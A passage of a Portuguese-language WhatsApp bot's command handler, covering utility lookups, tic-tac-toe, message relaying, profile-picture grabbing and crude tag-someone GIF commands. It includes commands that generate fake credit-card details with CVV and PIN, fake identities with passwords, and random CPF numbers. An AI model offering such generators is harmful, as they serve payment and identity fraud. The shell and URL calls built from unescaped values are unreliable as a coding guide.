exec(`ffmpeg -i ${bas} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break

//_LISTAR USUÁRIO ONLINE
case 'online': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(loli.chats.get(ido).presences), loli.user.jid]
loli.sendMessage(from, 'Lista de usuários online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: say1,
contextInfo: { mentionedJid: online }
})
break

case 'cep':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply('digite o cep que deseja buscar')
cep = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/cep/v1/${cep}`)
if (hehe.error) return reply(hehe.error)
ccg =
` INFORMAÇÕES DO CEP
  ‣ Cep: ${hehe.cep}
  ‣ Estado: ${hehe.state}
  ‣ Cidade: ${hehe.city}`
loli.sendMessage(from, ccg, text, {quoted:mek})
break


case 'ddd':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply('digite o ddd que deseja buscar')
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${q}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ⪧ *${ddds.data.cities[i]}*\n` }
loli.sendMessage(from, dddlist, text, {quoted: horiloc})	
break

case 'cartão':
case 'cartao':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
hehe = await fetchJson(`https://videfikri.com/api/ccgenerator/`)
if (hehe.error) return reply(hehe.error)
ccg =
` Cartão gerado com sucesso
   ‣ Bandeira: ${hehe.result.card.network}
   ‣ Número: ${hehe.result.card.number}
   ‣ Cvv: ${hehe.result.card.cvv}
   ‣ Pin: ${hehe.result.card.pin}
   ‣ Balanço: ${hehe.result.card.balance}
   ‣ Validade: ${hehe.result.card.expiration_month}/${hehe.result.card.expiration_year}`
loli.sendMessage(from, ccg, text, {quoted:mek})
break

case 'dadosfake':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
dadosf = 
`    DADOS GERADOS
   ‣ Nome: ${anu.name}
   ‣ Sexo: ${anu.gender}
   ‣ Idade: ${anu.age}
   ‣ Telefone: ${anu.phone}
   ‣ Tipo sanguíneo: ${anu.blood_type}
   ‣ E-mail: ${anu.email}
   ‣ Senha: ${anu.password}
   ‣ CEP: ${anu.zip_code}`
loli.sendMessage(from, dadosf, text, {quoted: say1})
break

//_RETIRAR BOT DO GRUPO
case 'leave': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (isOwner) {
loli.groupLeave(from)
} else {
reply(ptbr.admin())
}
break

//_MENCIONA TODOS OS MEMBROS DO GRUPO 
case 'hidetag': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
loli.updatePresence(from, Presence.composing) 
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(ptbr.group())
htg = body.slice(9)
group = await loli.groupMetadata(from);
member = group['participants']
jids = [];
member.map( async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: htg,
contextInfo: {mentionedJid: jids},
quoted: say1
}
await loli.sendMessage(from, options, text)
break

/*case 'registrar': //fuciona
case 'registrar':
case 'register':
case 'registra':
case 'registrar':
addFilter(from)
if (isUser) return  reply('você já está registrado')
if (!q.includes('|')) return reply(`Digite da forma correta:\nComando: ${prefix}registrar nome|idade\nExemplo: ${prefix}registrar ${SeuNome}|18`)
if (args.length < 1) return reply(`Como se registrar:\nComando: ${prefix}registrar nome|idade\nExemplo: ${prefix}registrar ${SeuNome}|18`)
const namaUser = q.substring(0, q.indexOf('|') - 0)
const umurUser = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return reply(`Digite da forma correta:\nComando: ${prefix}registrar nome|idade\nExemplo: ${prefix}registrar ${SeuNome}|18`)
if (namaUser.length >= 60) return reply(`Seu nome é muito longo`)
if (umurUser > 40) return reply(`Idade máxima é 40 anos`)
if (umurUser < 12) return reply(`Idade mínima é 12 anos`)
veri = sender
try {
ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
ppimg = 'https://i.ibb.co/rxPtZS8/foto.jpg'
}
captionnya = 
`    〘 Registrado(a) com sucesso 〙
  Código: ${serialUser}
╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╾
╠≽️ Dia: ${date}
╠≽️ Hora: ${hr}
╠≽️ Nome de usuário: @${sender.split("@")[0]}
╠≽️ Nome de registro: ${namaUser}
╠≽️ Idade: ${umurUser}
╠≽️ Seu link wame: wa.me/${sender.split("@")[0]}
╠≽️ Número: ${sender.split("@")[0]}
╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╾
você se registrou, digite ${prefix}menu para listar meus comandos`
daftarimg = await getBuffer(ppimg)
addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
loli.sendMessage(from, daftarimg, image, {quoted: say1, caption: captionnya, contextInfo: {mentionedJid: [sender]}})                    
break*/

case 'cpf1': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
cp1 = `${Math.floor(Math.random() * 300) +600}`
cp2 = `${Math.floor(Math.random() * 300) +600}`
cp3 = `${Math.floor(Math.random() * 300) +600}`
cp4 = `${Math.floor(Math.random() * 30) +60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
loli.sendMessage(from, `CPF gerado: ${cpf}`, text, {quoted: say1})
break
                 
case 'ttthelp': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.sendMessage(from, ttthelp(prefix)
, text)
break

case 'tttme': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
loli.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:mek})
break

case 'tttrank': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
//if (tictactoe.length < 3) return reply(`Humm, é necessário que no mínimo 3 pessoas tenham jogado...`)
tictactoe.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '【 TTT RANKS 】\n\n'
try {
for (let i = 0; i < 7; i++) {
if (i == 0) {board += `${i + 1}º 🥇 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
} else if (i == 1) {board += `${i + 1}º 🥈 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
} else if (i == 2) {board += `${i + 1}º 🥉 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
} else if (i == 3) {board += `${i + 1}º 🏆 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
} else if (i == 4) {board += `${i + 1}º 💎 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
} else if (i == 5) {board += `${i + 1}º 🐂 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
} else if (i == 6) {board += `${i + 1}º 🐂 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n║ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n║ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n║ ➣ Empates: ${tictactoe[i].ties} 🌀\n║ ➣ Pontos: ${tictactoe[i].points} ⭐\n╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╸\n\n`
}
mentioned_jid.push(tictactoe[i].jid)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await loli.sendMessage(from, `Humm, é necessário que no mínimo 3 pessoas tenham jogado...`, text, {quoted: mek})
}
break

case 'coord' : //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
tttset.playertest = sender
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "off") {
reply(`Você ainda não iniciou o jogo\nDigite ${prefix}ttt [DIFICULDADE] para iniciar`)
} else if (tttset.player != tttset.playertest) {
reply(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.tttantibug == "on") {
reply(`Aguarde a ação anterior ser concluída...`)
} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' &&
coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
reply(`Digite o comando com uma coordenada\nExemplo: ${prefix}coord a1`)
tttset.tttantibug = "off"
} else {
switch (args[0]) {
case 'a1':
if (esp.a1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.a2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a3':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.a3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b1':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.b1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.b2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b3':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.b3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c1':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.c1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.c2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c3':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (esp.c3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
}
tttset.reActivate1 = "on"
reply(`🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
if (WinnerX()) {
if (isLevelingOn) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = Math.floor(Math.random() * 25) + 25
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 75) + 75
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = Math.floor(Math.random() * 200) + 200
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 1000) + 1000
addLevelingXp(tttset.player, randomTTTXP)
break
}
loli.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉\n\n➣  RECOMPENSA: +${randomTTTXP} XP 🔮`, text)
} else {
loli.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉`, text)
}
const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
if (isLevelingOn) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 25) + 25)
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = 0 - (Math.floor(Math.random() * 400) + 400)
addLevelingXp(tttset.player, randomTTTXP)
break
}	
loli.sendMessage(from, `🎉🎉 VITÓRIA DO BOT 🎉🎉\n\n➣  PUNIÇÃO: ${randomTTTXP} XP 🔮`, text)
} else {
loli.sendMessage(from, `🎉🎉 VITÓRIA DO BOT 🎉🎉`, text)
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (Tie()) {
if (isLevelingOn) {
loli.sendMessage(from, `🎉🎉 EMPATE 🎉🎉\n\n➣  NÃO HÁ GANHOS NEM PERDAS`, text)
} else {
loli.sendMessage(from, `🎉🎉 EMPATE 🎉🎉`, text)
}
const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break

case 'outros': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const outros1 = fs.readFileSync('./src/outros.mp4')
const chatts5 = `${totalchat.length}`
loli.sendMessage(from, outros1,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `

╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts5} ⟨📳⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚊𝚕𝚎𝚊𝚝𝚘́𝚛𝚒𝚘
┃⋆│💎➢ ${prefix}More ⟨🧐⟩
┃⋆│➥ Adicionar "Ler mais" a um texto
┃⋆│💎➢ ${prefix}Send ⟨☔⟩
┃⋆│➥ Enviar mensagens pelo bot
┃⋆│💎➢ ${prefix}Gerarnick ⟨👾⟩
┃⋆│➥ Gerarnicks com seu nome
┃⋆│💎➢ ${prefix}Nickff ⟨💖⟩
┃⋆│➥ Gerar outros tipo de letras
┃⋆│💎➢ ${prefix}Getpic ⟨💎⟩
┃⋆│➥ Pega a foto de perfil da pessoa
┃⋆│💎➢ ${prefix}Quando (texto) ⟨🔥⟩
┃⋆│➥ Lhe diz quando irá acontecer
┃⋆│💎➢ ${prefix}Diga (texto) ⟨🌟⟩
┃⋆│➥ O bot irá digitar o que você digitou
┃⋆│💎➢ ${prefix}Map (País) ⟨🌀⟩
┃⋆│➥ Mostrara o mapa do país
┃⋆╰───────────────────
╰━════════════════════⊷`})
break

case 'more':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return reply("Use texte|texto")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
reply(text1 + readmore + text2)
break

case 'send':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo: ${prefix}send 55749xxx0904|gado`)
if (!q.includes('|')) return reply(`Exemplo: ${prefix}send 55749xxx0904|gado\nNão esqueça do: | `)
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var pesan = pc.split("|")[1];
loli.sendMessage(nomor + '@s.whatsapp.net', pesan, text)
break

case 'gerarnick': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo: ${prefix + command} teu nick `)
query = args.join(" ")
send = await fetchJson(`http://brizas-api.herokuapp.com/gerador/fancytext?apikey=BOT SOPHIA&text=${query}`)
teks = ` 🧙🏻‍♂️NICKS GERADOS COM SUCESSO!🧙🏻‍♂️
👾 ${send.random_1} 
👾 ${send.random_2} 
👾 ${send.random_3} 
👾 ${send.random_4} 
👾 ${send.random_5}
👾 ${send.squares}
👾 ${send.inverted_squares}
👾 ${send.italic}
👾 ${send.bold}
👾 ${send.future_alien}
👾 ${send.asian_1}
👾 ${send.asian_2}
👾 ${send.squiggle}
👾 ${send.squiggle_2}
👾 ${send.squiggle_3}
👾${send.squiggle_4}
👾 ${send.neon}

 
➣    ▉║█▐▉▉▐▐▍█║▍▉▏▍▍
➣    ▉║█▐▉▉▐▐▍█║▍▉▏▍▍
 `
loli.sendMessage(from, teks, text, {quoted: say1})
break	     	   			 		     	   			 	     	   			 		   

case 'nickff':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo: ${prefix + command} teu nick`)
 query = args.join(" ")
send = await fetchJson(`http://brizas-api.herokuapp.com/gerador/fancytext?apikey=BOT SOPHIA&text=${query}`)
teks = `✅ NICKS PERSONALIZADOS ✅

LISTA RANDOM:
🔰 ${send.random_1} 
🔰 ${send.random_2} 
🔰 ${send.random_3} 
🔰 ${send.random_4} 
🔰 ${send.random_5}
 
 FONTES PRÉ-DEFINIDAS:
🔰 ${send.squares}
🔰 ${send.inverted_squares}
🔰 ${send.italic}
🔰 ${send.bold}
🔰 ${send.future_alien}
🔰 ${send.asian_1}
🔰 ${send.asian_2}
🔰 ${send.squiggle}
🔰 ${send.squiggle_2}
🔰 ${send.squiggle_3}
🔰 ${send.squiggle_4}
🔰 ${send.neon}`
loli.sendMessage(from, teks, text, {
quoted: say1
})
break

case 'getpic':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Siap Boss')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
pp = await loli.getProfilePicture(mentioned)
buffer = await getBuffer(pp)

loli.sendMessage(from, buffer, image, {
thumbnail:null,
quoted: say1,
contextInfo: {
"forwardingScore": 999,
"isForwarded": true
}
})
} catch (err) {
loli.sendMessage(from, buffer, image, {
thumbnail:null,
quoted: say1,
contextInfo: {
"forwardingScore": 999,
"isForwarded": true
}
})
}
break

case 'quando': //by: Resen
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
if (args.length < 1) return reply('Digite a pergunta')
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKbGbDLtlUvLFrHxoqszAw0ytfOfari4GSOA&usqp=CAU`)
random = arrayQND[Math.floor(Math.random() * arrayQND.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (random == 'Hoje' || random == 'Amanhã' || random == 'Nunca') {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${random}`
} else if (random2 == 1) {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: 1 ${random}`
} else {
random3 = arrayQND2[Math.floor(Math.random() * arrayQND2.length)]
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${random2} ${random3}`
}
loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: `${texto}`})
break

case 'diga':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
teks = body.slice(6)
if (args.length < 1) return
saying = teks
loli.sendMessage(from, saying, text)
break

case 'map':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
data = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`)
hasil = await getBuffer(data.gambar)
loli.sendMessage(from, hasil, image, {quoted: say1, caption: `Resultado de *${body.slice(5)}*`})
break

case 'google':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
teks = body.slice(13)
loli.updatePresence(from, Presence.composing)
reply('Pesquisando Aguarde..')
anu = await fetchJson (`https://api-gdr2.herokuapp.com/api/search/gimage?q=${teks}`)
buffer = await getBuffer(anu.result)
loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail: null})
break

case 'timer':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args[1]=="segundos") {var timer = args[0]+"000"
} else if (args[1]=="minuto") {var timer = args[0]+"0000"
} else if (args[1]=="hora") {var timer = args[0]+"00000"
} else {return reply("*selecionar:*\nsegundos\nminuto\nhora")}
setTimeout( () => {
reply("O tempo acabou")
}, timer)
break

/*case 'tapa':
tapa = ["1"]
res = tapa[Math.floor(Math.random() * tapa.length)]
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá o tapa')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} deu um tapa no(a) @${mentioned[0].split('@')[0]} 🔥` 
loli.sendMessage(from, result, MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
loli.sendMessage(from, tobiz,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
result = fs.readFileSync(`./src/tapa` + res + `.mp4`)
break*/

case 'tiro':
case 'tiros':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá uns tiro')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Deu ${randomtiro} tiros no(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const tirors = fs.readFileSync('./src/tiros.mp4')
loli.sendMessage(from, tirors,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'cutuca':
case 'cutucar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer cutucar')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Cutuca ${cutucada} o(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const cutucar = fs.readFileSync('./src/cutucar.mp4')
loli.sendMessage(from, cutucar,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'linguada':
case 'chupada':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(`marque o alvo que você quer da uma ${linguidaa}`)
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Deu uma ${linguidaa} no(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const linguada = fs.readFileSync('./src/linguida.mp4')
loli.sendMessage(from, linguada,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'tapa':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá o tapa')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Que fofo... @${sender.split("@")[0]} deu um tapa no(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const tapa = fs.readFileSync('./src/tapa2.mp4')
loli.sendMessage(from, tapa,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'mamada':
case 'chupar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá uma mamada')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Acabo de da uma Mamada na(o) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const mamar = fs.readFileSync('./src/mamar.mp4')
loli.sendMessage(from, mamar,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'sexo':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
